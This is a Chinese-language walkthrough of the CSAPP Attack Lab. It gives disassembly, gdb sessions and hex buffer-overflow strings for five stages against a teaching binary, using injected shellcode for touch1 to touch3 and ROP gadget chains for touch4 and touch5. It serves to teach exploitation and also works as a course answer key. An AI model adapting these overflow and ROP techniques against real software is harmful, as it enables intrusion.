# 解答

## 前置知识

###  工具用法

```cmd
// 将字符串转化为攻击文件
./hex2rew < Hewi.txt > attacki.txt
// 将攻击文件给程序运行
./ctarget -i attacki.txt
```

### 其他

ctarget的函数调用链：main() -> test() -> getbuf() -> Gets()

# 第一阶段

## touch1

### 汇编代码

```assembly
00000000004016e1 <touch1>: #地址为0x4016e1
  4016e1:	48 83 ec 08          	sub    $0x8,%rsp
  4016e5:	c7 05 0d 2e 20 00 01 	movl   $0x1,0x202e0d(%rip)        # 6044fc <vlevel>
  4016ec:	00 00 00 
  4016ef:	bf 11 2e 40 00       	mov    $0x402e11,%edi
  4016f4:	e8 57 f5 ff ff       	callq  400c50 <puts@plt>
  4016f9:	bf 01 00 00 00       	mov    $0x1,%edi
  4016fe:	e8 f6 03 00 00       	callq  401af9 <validate>
  401703:	bf 00 00 00 00       	mov    $0x0,%edi
  401708:	e8 d3 f6 ff ff       	callq  400de0 <exit@plt>
```

```assembly
00000000004016cb <getbuf>:
  4016cb:	48 83 ec 38          	sub    $0x38,%rsp #容量56
  4016cf:	48 89 e7             	mov    %rsp,%rdi
  4016d2:	e8 33 02 00 00       	callq  40190a <Gets>
  4016d7:	b8 01 00 00 00       	mov    $0x1,%eax
  4016dc:	48 83 c4 38          	add    $0x38,%rsp
  4016e0:	c3                   	retq   
```

### 解答过程

本题不需要注入代码，只需将字符串注入

原理为：用字符串填充缓冲区，使得调用代码时候直接传入了touch1的地址，从而调用touch1即可

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// 以上56个字节为填充缓冲区
e1 16 40 00 00 00 00 00
// 注意小端法
```

## touch2

### 汇编代码

```assembly
000000000040170d <touch2>: #地址0x40170d
  40170d:	48 83 ec 08          	sub    $0x8,%rsp
  401711:	89 fe                	mov    %edi,%esi
  401713:	c7 05 df 2d 20 00 02 	movl   $0x2,0x202ddf(%rip)        # 6044fc <vlevel>
  40171a:	00 00 00 
  40171d:	3b 3d e1 2d 20 00    	cmp    0x202de1(%rip),%edi        # 604504 <cookie>需要将edi中写入cookie
  401723:	75 1b                	jne    401740 <touch2+0x33>
  401725:	bf 38 2e 40 00       	mov    $0x402e38,%edi
  40172a:	b8 00 00 00 00       	mov    $0x0,%eax
  40172f:	e8 4c f5 ff ff       	callq  400c80 <printf@plt>
  401734:	bf 02 00 00 00       	mov    $0x2,%edi
  401739:	e8 bb 03 00 00       	callq  401af9 <validate>
  40173e:	eb 19                	jmp    401759 <touch2+0x4c>
  401740:	bf 60 2e 40 00       	mov    $0x402e60,%edi
  401745:	b8 00 00 00 00       	mov    $0x0,%eax
  40174a:	e8 31 f5 ff ff       	callq  400c80 <printf@plt>
  40174f:	bf 02 00 00 00       	mov    $0x2,%edi
  401754:	e8 52 04 00 00       	callq  401bab <fail>
  401759:	bf 00 00 00 00       	mov    $0x0,%edi
  40175e:	e8 7d f6 ff ff       	callq  400de0 <exit@plt>
```

### 解答过程

首先要将cookie写入edi

```assembly
mov    $0x20587c5b,%rdi
pushq  $0x40170d
ret
```

下面先编译再反汇编，得到机器代码

```cmd
root@20b6bbf58d11:~/Downloads/target232111034# gcc -c Hex2.s
root@20b6bbf58d11:~/Downloads/target232111034# objdump -d Hex2.o
Hex2.o:     file format elf64-x86-64
Disassembly of section .text:
0000000000000000 <.text>:
   0:	48 c7 c7 5b 7c 58 20 	mov    $0x20587c5b,%rdi
   7:	68 0d 17 40 00       	pushq  $0x40170d
   c:	c3                   	retq   
```

接下来使用gdb调试获得rsp的地址

```cmd
root@20b6bbf58d11:~/Downloads/target232111034# gdb ctarget
(gdb) break getbuf
(gdb) run -q
(gdb) disas
(gdb) stepi
(gdb) p/x $rsp
$1 = 0x5561deb8
```

之后便可以得到答案

```txt
48 c7 c7 5b 7c 58 20 68 
0d 17 40 00 c3 00 00 00
// 开始是注入的代码
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// 填充满至56个字节
b8 de 61 55 00 00 00 00
// 注意小端法，返回地址
```

## touch3

### 汇编代码

```assembly
00000000004017e1 <touch3>: #首地址0x4017e1
  4017e1:	53                   	push   %rbx
  4017e2:	48 89 fb             	mov    %rdi,%rbx
  4017e5:	c7 05 0d 2d 20 00 03 	movl   $0x3,0x202d0d(%rip)        # 6044fc <vlevel>
  4017ec:	00 00 00 
  4017ef:	48 89 fe             	mov    %rdi,%rsi
  4017f2:	8b 3d 0c 2d 20 00    	mov    0x202d0c(%rip),%edi        # 604504 <cookie>
  4017f8:	e8 66 ff ff ff       	callq  401763 <hexmatch>		#此处调用了函数hexmatch
  4017fd:	85 c0                	test   %eax,%eax				#注意test
  4017ff:	74 1e                	je     40181f <touch3+0x3e>
  401801:	48 89 de             	mov    %rbx,%rsi
  401804:	bf 88 2e 40 00       	mov    $0x402e88,%edi
  401809:	b8 00 00 00 00       	mov    $0x0,%eax
  40180e:	e8 6d f4 ff ff       	callq  400c80 <printf@plt>
  401813:	bf 03 00 00 00       	mov    $0x3,%edi
  401818:	e8 dc 02 00 00       	callq  401af9 <validate>
  40181d:	eb 1c                	jmp    40183b <touch3+0x5a>
  40181f:	48 89 de             	mov    %rbx,%rsi
  401822:	bf b0 2e 40 00       	mov    $0x402eb0,%edi
  401827:	b8 00 00 00 00       	mov    $0x0,%eax
  40182c:	e8 4f f4 ff ff       	callq  400c80 <printf@plt>
  401831:	bf 03 00 00 00       	mov    $0x3,%edi
  401836:	e8 70 03 00 00       	callq  401bab <fail>
  40183b:	bf 00 00 00 00       	mov    $0x0,%edi
  401840:	e8 9b f5 ff ff       	callq  400de0 <exit@plt>
```

### 解答过程

首先先仿照touch1使函数直接调用到touch3

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e1 17 40 00 00 00 00 00
```

通过gdb调试找到test输入参数的地址

```cmd
(gdb) break *0x4017f8
(gdb) break *0x4017fd
(gdb) run -i testa3.txt

// 分别输出调用hexmatch前后的缓冲区内容
(gdb) x /72b 0x5561deb8
0x5561deb8:	0	0	0	0	0	0	0	0
0x5561dec0:	0	0	0	0	0	0	0	0
0x5561dec8:	0	0	0	0	0	0	0	0
0x5561ded0:	0	0	0	0	0	0	0	0
0x5561ded8:	0	0	0	0	0	0	0	0
0x5561dee0:	0	0	0	0	0	0	0	0
0x5561dee8:	0	0	0	0	0	0	0	0
0x5561def0:	0	96	88	85	0	0	0	0
0x5561def8:	0	0	0	0	0	0	0	0
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004017fd in touch3 (
    sval=0x606010 "\210$\255", <incomplete sequence \373>) at visible.c:73
73	in visible.c
(gdb) x /72b 0x5561deb8
0x5561deb8:	0	0	0	0	0	0	0	0
0x5561dec0:	0	0	0	0	0	0	0	0
0x5561dec8:	0	0	0	0	0	0	0	0
0x5561ded0:	16	96	96	0	0	0	0	0
0x5561ded8:	-24	95	104	85	0	0	0	0
0x5561dee0:	3	0	0	0	0	0	0	0
0x5561dee8:	-3	23	64	0	0	0	0	0
0x5561def0:	0	96	88	85	0	0	0	0
0x5561def8:	0	0	0	0	0	0	0	0
```

可以看出缓冲区的 56 个字节里，前16个字节用来存储我们的注入代码，

而0x5561dec8~0x5561dee7这40个字节内并没有连续的 8 个没有被覆盖的字节。

在缓冲区外，0x5561def0后的八个字节用于存储返回地址（即缓冲区起始地址）

我们发现0x5561def8后这8个字节并没有发生变化，恰好可以用来存储我们的cookie字符串。

据此写出攻击代码的汇编代码

```assembly
mov    $0x5561def8,%rdi
pushq  $0x4017e1
ret
```

经汇编与反汇编

```cmd
root@20b6bbf58d11:~/Downloads/target232111034# gcc -c Hex3.s
root@20b6bbf58d11:~/Downloads/target232111034# objdump -d Hex3.o

Hex3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 f8 de 61 55 	mov    $0x5561def8,%rdi
   7:	68 e1 17 40 00       	pushq  $0x4017e1
   c:	c3                   	retq 
```

由此可以写出注入字符串

```txt
48 c7 c7 f8 de 61 55 68 
e1 17 40 00 c3 00 00 00
// 注入的代码
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
//填充到56，填满缓冲区
b8 de 61 55 00 00 00 00
// 缓冲区起始地址覆盖原有返回地址
32 30 35 38 37 63 35 62
// cookie的字符的字节表示
```

# 第二阶段

## 本阶段要求分析

### 汇编代码farm

```assembly
0000000000401869 <start_farm>:
  401869:	b8 01 00 00 00       	mov    $0x1,%eax
  40186e:	c3                   	retq   

000000000040186f <getval_135>:
  40186f:	b8 53 48 89 c7       	mov    $0xc7894853,%eax
  401874:	c3                   	retq   

0000000000401875 <addval_102>:
  401875:	8d 87 68 89 c7 90    	lea    -0x6f387698(%rdi),%eax
  40187b:	c3                   	retq   

000000000040187c <addval_181>:
  40187c:	8d 87 5f 02 58 90    	lea    -0x6fa7fda1(%rdi),%eax
  401882:	c3                   	retq   

0000000000401883 <setval_242>:
  401883:	c7 07 10 8c 58 92    	movl   $0x92588c10,(%rdi)
  401889:	c3                   	retq   

000000000040188a <addval_214>:
  40188a:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
  401890:	c3                   	retq   

0000000000401891 <setval_245>:
  401891:	c7 07 65 48 89 c7    	movl   $0xc7894865,(%rdi)
  401897:	c3                   	retq   

0000000000401898 <getval_380>:
  401898:	b8 90 5e 58 92       	mov    $0x92585e90,%eax
  40189d:	c3                   	retq   

000000000040189e <setval_421>:
  40189e:	c7 07 ae 48 99 c7    	movl   $0xc79948ae,(%rdi)
  4018a4:	c3                   	retq   

00000000004018a5 <mid_farm>:
  4018a5:	b8 01 00 00 00       	mov    $0x1,%eax
  4018aa:	c3                   	retq   

00000000004018ab <add_xy>:
  4018ab:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4018af:	c3                   	retq   

00000000004018b0 <addval_393>:
  4018b0:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  4018b6:	c3                   	retq   

00000000004018b7 <setval_370>:
  4018b7:	c7 07 89 d1 08 c0    	movl   $0xc008d189,(%rdi)
  4018bd:	c3                   	retq   

00000000004018be <setval_307>:
  4018be:	c7 07 49 89 c2 c3    	movl   $0xc3c28949,(%rdi)
  4018c4:	c3                   	retq   

00000000004018c5 <setval_325>:
  4018c5:	c7 07 89 d1 84 db    	movl   $0xdb84d189,(%rdi)
  4018cb:	c3                   	retq   

00000000004018cc <getval_402>:
  4018cc:	b8 89 d1 c1 ad       	mov    $0xadc1d189,%eax
  4018d1:	c3                   	retq   

00000000004018d2 <addval_432>:
  4018d2:	8d 87 89 c2 48 d2    	lea    -0x2db73d77(%rdi),%eax
  4018d8:	c3                   	retq   

00000000004018d9 <getval_455>:
  4018d9:	b8 89 ce 28 c0       	mov    $0xc028ce89,%eax
  4018de:	c3                   	retq   

00000000004018df <addval_489>:
  4018df:	8d 87 89 ce 20 c0    	lea    -0x3fdf3177(%rdi),%eax
  4018e5:	c3                   	retq   

00000000004018e6 <setval_308>:
  4018e6:	c7 07 89 d1 c1 7b    	movl   $0x7bc1d189,(%rdi)
  4018ec:	c3                   	retq   

00000000004018ed <getval_461>:
  4018ed:	b8 30 89 c2 94       	mov    $0x94c28930,%eax
  4018f2:	c3                   	retq   

00000000004018f3 <setval_387>:
  4018f3:	c7 07 2e 4a 89 e0    	movl   $0xe0894a2e,(%rdi)
  4018f9:	c3                   	retq   

00000000004018fa <addval_296>:
  4018fa:	8d 87 68 89 e0 90    	lea    -0x6f1f7698(%rdi),%eax
  401900:	c3                   	retq   

0000000000401901 <setval_160>:
  401901:	c7 07 a9 ce 38 db    	movl   $0xdb38cea9,(%rdi)
  401907:	c3                   	retq   

0000000000401908 <getval_332>:
  401908:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
  40190d:	c3                   	retq   

000000000040190e <setval_342>:
  40190e:	c7 07 97 a7 8b ce    	movl   $0xce8ba797,(%rdi)
  401914:	c3                   	retq   

0000000000401915 <setval_112>:
  401915:	c7 07 48 99 e0 c3    	movl   $0xc3e09948,(%rdi)
  40191b:	c3                   	retq   

000000000040191c <getval_482>:
  40191c:	b8 99 d1 38 c0       	mov    $0xc038d199,%eax
  401921:	c3                   	retq   

0000000000401922 <setval_217>:
  401922:	c7 07 48 89 e0 92    	movl   $0x92e08948,(%rdi)
  401928:	c3                   	retq   

0000000000401929 <addval_120>:
  401929:	8d 87 89 d1 48 c0    	lea    -0x3fb72e77(%rdi),%eax
  40192f:	c3                   	retq   

0000000000401930 <addval_226>:
  401930:	8d 87 99 ce 38 db    	lea    -0x24c73167(%rdi),%eax
  401936:	c3                   	retq   

0000000000401937 <addval_467>:
  401937:	8d 87 89 c2 28 d2    	lea    -0x2dd73d77(%rdi),%eax
  40193d:	c3                   	retq   

000000000040193e <setval_334>:
  40193e:	c7 07 89 ce 38 db    	movl   $0xdb38ce89,(%rdi)
  401944:	c3                   	retq   

0000000000401945 <getval_180>:
  401945:	b8 09 c2 84 db       	mov    $0xdb84c209,%eax
  40194a:	c3                   	retq   

000000000040194b <setval_274>:
  40194b:	c7 07 48 89 e0 92    	movl   $0x92e08948,(%rdi)
  401951:	c3                   	retq   

0000000000401952 <getval_319>:
  401952:	b8 8d d1 38 db       	mov    $0xdb38d18d,%eax
  401957:	c3                   	retq   

0000000000401958 <addval_216>:
  401958:	8d 87 89 c2 28 c0    	lea    -0x3fd73d77(%rdi),%eax
  40195e:	c3                   	retq   

000000000040195f <addval_297>:
  40195f:	8d 87 89 ce 00 d2    	lea    -0x2dff3177(%rdi),%eax
  401965:	c3                   	retq   

0000000000401966 <addval_494>:
  401966:	8d 87 89 ce 94 c9    	lea    -0x366b3177(%rdi),%eax
  40196c:	c3                   	retq   

000000000040196d <getval_339>:
  40196d:	b8 04 89 c2 c3       	mov    $0xc3c28904,%eax
  401972:	c3                   	retq   

0000000000401973 <getval_428>:
  401973:	b8 48 89 e0 92       	mov    $0x92e08948,%eax
  401978:	c3                   	retq   

0000000000401979 <addval_439>:
  401979:	8d 87 c9 d1 38 db    	lea    -0x24c72e37(%rdi),%eax
  40197f:	c3                   	retq   

0000000000401980 <addval_443>:
  401980:	8d 87 0f 48 89 e0    	lea    -0x1f76b7f1(%rdi),%eax
  401986:	c3                   	retq   

0000000000401987 <end_farm>:
  401987:	b8 01 00 00 00       	mov    $0x1,%eax
  40198c:	c3                   	retq   
  40198d:	0f 1f 00             	nopl   (%rax)
```

### 要求

1. 只能使用`movq` 、`popq`、 `ret`、 `nop`的`gadget`。
2. 只能使用前八个x86-64寄存器。
3. 只能用两个`gadget`实现此次攻击

对应下表寻找指令解题

<img src="E:\Typora\picture\DM_20240509205118_001.png" alt="DM_20240509205118_001" style="zoom:70%;" />

### 指令参考

```assembly
# 一些下面将使用的指令的地址
popq	%rax				#8c 18 40 00 00 00 00 00	

mov		%rax,%rdi			#94 18 40 00 00 00 00 00
mov 	%rsp,%rax			#09 19 40 00 00 00 00 00

movl 	%eax,%edx			#6f 19 40 00 00 00 00 00
movl 	%edx,%ecx			#b9 18 40 00 00 00 00 00
movl 	%ecx,%esi			#e1 18 40 00 00 00 00 00

lea		(%rdi,%rsi,1),%rax	#ab 18 40 00 00 00 00 00 
```

## touch4

需要用上述要求再次完成touch2

和touch2思路一致，我们需要将将寄存器%rdi的值设置为cookie。在上面找到的满足条件的gadget中可以凑出能够实现攻击的指令。

先将寄存器%rax的值设置为cookie，然后复制给%rdi。
```assembly
popq     %rax
ret                  
mov      %rax,%rdi
ret
```

可得攻击字符串为
```txt
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 	//以上（任意字节除0x0a）填充满整个缓冲区（56字节）以致溢出。

8c 18 40 00 00 00 00 00		//用指令popq     %rax的起始地址覆盖掉原先的返回地址。
5b 7c 58 20 00 00 00 00     //cookie 0x20587c5b
94 18 40 00 00 00 00 00     //指令mov      %rax,%rdi
0d 17 40 00 00 00 00 00     //touch2 的起始地址
```

## touch5

需要用上述要求再次完成touch3

和Level 3思路一致，将寄存器%rdi的值设置为cookie字符串的指针即存储cookie字符串的地址。

在上面找到的满足条件的gadget中可以凑出能够实现攻击的指令。先把%rsp存储的栈顶指针值复制给%rdi， 再将%eax的值设置为cookie字符串地址在栈中的偏移量并复制给%esi，最后将二者相加即为cookie字符串的存储地址。

```assembly
mov   %rsp,%rax
ret
mov   %rax,%rdi
ret
popq  %rax         
ret                 
movl  %eax,%edx
ret
movl  %edx,%ecx
ret
movl  %ecx,%esi
ret
lea   (%rdi,%rsi,1),%rax
ret
mov   %rax,%rdi
ret
```

当指令指到ret指令行时，说明一个函数已经结束了，这时候%rsp已经从被调用函数的栈指到了调用函数构建的返回地址位置。

所以当执行第一条指令时，%rsp指向当前栈顶即存储下一条指令的地址，而后面的指令执行完后最终不会使该%rsp值改变。

第一条指令之后从第二条指令开始，cookie字符串之前还有有9条指令，共占有72个字节即0x48字节，此即cookie字符串的地址在栈中的偏移量。

于是可得攻击字符串：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	//以上（任意字节除0x0a）填充满整个缓冲区（56字节）以致溢出。

09 19 40 00 00 00 00 00
94 18 40 00 00 00 00 00
8c 18 40 00 00 00 00 00

48 00 00 00 00 00 00 00	//cookie字符串地址在栈中的偏移量为0x48

6f 19 40 00 00 00 00 00
b9 18 40 00 00 00 00 00
e1 18 40 00 00 00 00 00
ab 18 40 00 00 00 00 00
94 18 40 00 00 00 00 00

e1 17 40 00 00 00 00 00	//touch3 的起始地址。
32 30 35 38 37 63 35 62	//cookie字符串的字节表示。
```

| cookie  |               |
| ------- | ------------- |
| &touch3 |               |
| 8       | cookie放入rdi |
| 7       | 计算          |
| 6       | 获取偏移量    |
| 5       | 获取偏移量    |
| 4       | 获取偏移量    |
| 偏移量  | 获取偏移量    |
| 3       |               |
| 2       |               |
| 1       | 栈指针        |
| getbuf  |               |



